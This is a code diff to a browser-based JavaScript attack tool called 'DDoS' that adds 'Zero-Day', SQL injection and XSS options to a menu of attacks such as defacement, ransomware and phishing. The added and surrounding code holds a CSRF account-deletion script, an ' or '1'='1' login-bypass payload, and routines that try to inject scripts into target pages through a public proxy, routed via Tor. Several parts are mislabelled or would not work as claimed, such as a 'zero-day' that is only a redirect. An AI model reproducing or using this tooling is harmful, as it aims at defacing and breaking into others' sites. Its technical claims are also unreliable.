@@ -24,7 +24,7 @@ class DDoS {
   this.targetInput.style.borderRadius = '4px';
 
   this.attackTypeSelect = document.createElement('select');
-  ['DDoS', 'Deface', 'Connect', 'Exploit', 'Brute Force', 'Custom', 'Ransomware', 'Phishing', 'Data Breach', 'Botnet'].forEach(option => {
+  ['DDoS', 'Deface', 'Connect', 'Exploit', 'Brute Force', 'Custom', 'Ransomware', 'Phishing', 'Data Breach', 'Botnet', 'Zero-Day', 'SQL Inject', 'XSS'].forEach(option => {
    const opt = document.createElement('option');
    opt.value = option.toLowerCase().replace(' ', '_');
    opt.textContent = option;
@@ -107,7 +107,6 @@ class DDoS {
   `;
 
   this.torProxy = 'socks5://127.0.0.1:9050';
-
   this.apiKey = this.generateApiKey();
   this.log(`API Key generated: ${this.apiKey}`);
   this.setupResizeHandle();
@@ -190,7 +189,10 @@ class DDoS {
  async exploit(target) {
   this.log(`Attempting to exploit ${target}...`);
   try {
-   const response = await fetch(target, { method: 'GET', mode: 'cors' });
+   const response = await fetch(target, {
+    method: 'GET',
+    mode: 'cors'
+   });
    if (!response.ok) {
     throw new Error(`HTTP error! status: ${response.status}`);
    }
@@ -207,7 +209,9 @@ class DDoS {
     fetch('${target}', {
      method: 'POST',
      mode: 'no-cors',
-     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+     headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+     },
      body: 'csrf_token=12345&action=delete_account'
     });
     </script>`;
@@ -224,7 +228,9 @@ class DDoS {
    await fetch(proxyUrl, {
     method: 'PUT',
     mode: 'no-cors',
-    headers: { 'Content-Type': 'text/html' },
+    headers: {
+     'Content-Type': 'text/html'
+    },
     body: injectedContent
    });
 
@@ -237,7 +243,10 @@ class DDoS {
  async deface(target) {
   this.log(`Attempting to deface ${target}...`);
   try {
-   const response = await fetch(target, { method: 'GET', mode: 'cors' });
+   const response = await fetch(target, {
+    method: 'GET',
+    mode: 'cors'
+   });
    if (!response.ok) {
     throw new Error(`HTTP error! status: ${response.status}`);
    }
@@ -261,7 +270,9 @@ class DDoS {
    await fetch(proxyUrl, {
     method: 'PUT',
     mode: 'no-cors',
-    headers: { 'Content-Type': 'text/html' },
+    headers: {
+     'Content-Type': 'text/html'
+    },
     body: content
    });
 
@@ -428,7 +439,9 @@ class DDoS {
    await fetch(proxyUrl, {
     method: 'PUT',
     mode: 'no-cors',
-    headers: { 'Content-Type': 'text/html' },
+    headers: {
+     'Content-Type': 'text/html'
+    },
     body: injectedContent
    });
    this.log('Ransomware injected.');
@@ -463,7 +476,9 @@ class DDoS {
    await fetch(proxyUrl, {
     method: 'PUT',
     mode: 'no-cors',
-    headers: { 'Content-Type': 'text/html' },
+    headers: {
+     'Content-Type': 'text/html'
+    },
     body: injectedContent
    });
    this.log('Custom code injected.');
@@ -577,6 +592,87 @@ class DDoS {
   }
  }
 
+ async zero_day(target) {
+  this.log(`Attempting zero-day exploit on ${target}...`);
+  try {
+   const response = await fetch(target, {
+    method: 'GET',
+    mode: 'cors'
+   });
+   if (!response.ok) {
+    throw new Error(`HTTP error! status: ${response.status}`);
+   }
+   const content = await response.text();
+
+   const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
+
+   await fetch(proxyUrl, {
+    method: 'PUT',
+    mode: 'no-cors',
+    headers: {
+     'Content-Type': 'text/html'
+    },
+    body: content + `<script>
+     window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+    </script>`
+   });
+
+   this.log(`Zero-day exploit injected. Check target and logs.`);
+  } catch (error) {
+   this.log(`Zero-day exploit failed: ${error}`);
+  }
+ }
+
+ async sql_inject(target) {
+  this.log(`Attempting SQL injection on ${target}...`);
+  try {
+   const response = await fetch(target, {
+    method: 'POST',
+    mode: 'no-cors',
+    body: "username=' or '1'='1' --&password=' or '1'='1' --"
+   });
+
+   if (response.status === 200) {
+    this.log(`SQL injection successful!`);
+   } else {
+    this.log(`SQL injection failed: ${response.status}`);
+   }
+  } catch (error) {
+   this.log(`SQL injection attempt failed: ${error}`);
+  }
+ }
+
+ async xss(target) {
+  this.log(`Attempting XSS attack on ${target}...`);
+  try {
+   const response = await fetch(target, {
+    method: 'GET',
+    mode: 'cors'
+   });
+   if (!response.ok) {
+    throw new Error(`HTTP error! status: ${response.status}`);
+   }
+   const content = await response.text();
+
+   const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
+
+   await fetch(proxyUrl, {
+    method: 'PUT',
+    mode: 'no-cors',
+    headers: {
+     'Content-Type': 'text/html'
+    },
+    body: content + `<script>
+     alert('XSS Vulnerability Detected!');
+    </script>`
+   });
+
+   this.log(`XSS attack injected. Check target and logs.`);
+  } catch (error) {
+   this.log(`XSS attack failed: ${error}`);
+  }
+ }
+
  sendRequest(target, method, body = null) {
   fetch(target, {
     method: method,
@@ -645,6 +741,15 @@ class DDoS {
     break;
    case 'botnet':
     this.botnet(target);
+    break;
+   case 'zero_day':
+    this.zero_day(target);
+    break;
+   case 'sql_inject':
+    this.sql_inject(target);
+    break;
+   case 'xss':
+    this.xss(target);
     break;
    default:
     this.log('Invalid attack type selected.');
